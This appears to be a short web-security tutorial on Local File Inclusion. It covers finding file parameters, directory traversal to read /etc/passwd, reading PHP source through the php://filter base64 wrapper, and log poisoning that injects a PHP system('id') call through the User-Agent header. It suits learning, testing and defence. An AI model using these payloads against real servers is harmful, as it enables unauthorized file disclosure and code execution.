**Local File Inclusion (LFI)** is a web vulnerability that occurs when an application allows users to include local files from the server through manipulable parameters. 

## Identifying LFI

Look for parameters that might reference files, such as:

- `file=`
- `page=`
- `template=`
- `lang=`

**Example vulnerable URL:**
```bash
http://example.com/index.php?page=home.php
```

By manipulating the `page` parameter, you might access unintended files.

## Exploitation Techniques

#### Directory Traversal

Use `../` to navigate directories on the server.

```bash
http://example.com/index.php?page=../../../../etc/passwd
```

#### Forcing PHP File Inclusion Without Execution

By default, including a `.php` file causes the server to execute it rather than display its source code. However, certain methods can bypass execution.

The `php://filter` wrapper allows you to manipulate file streams before execution. Using the `convert.base64-encode` filter, you can encode the PHP file's content and decode it locally.

```bash
http://<target>/vulnerable.php?file=php://filter/convert.base64-encode/resource=index.php
```
This returns the Base64-encoded content of `index.php`. Decode it with a tool or command:

```bash
echo "<base64_content>" | base64 -d
```

**Possible vulnerable files:**
- `index.php`
- `index.php.bak`
- `index.php.save`
- `.index.php.swp` 

#### Log Poisoning

Inject malicious PHP code into server logs and include the log file.

1. Send a request with malicious input in a header (e.g., `User-Agent`):
```bash
User-Agent: <?php system('id'); ?>
```

2. Access the log file:
```bash
http://example.com/index.php?page=/var/log/apache2/access.log
```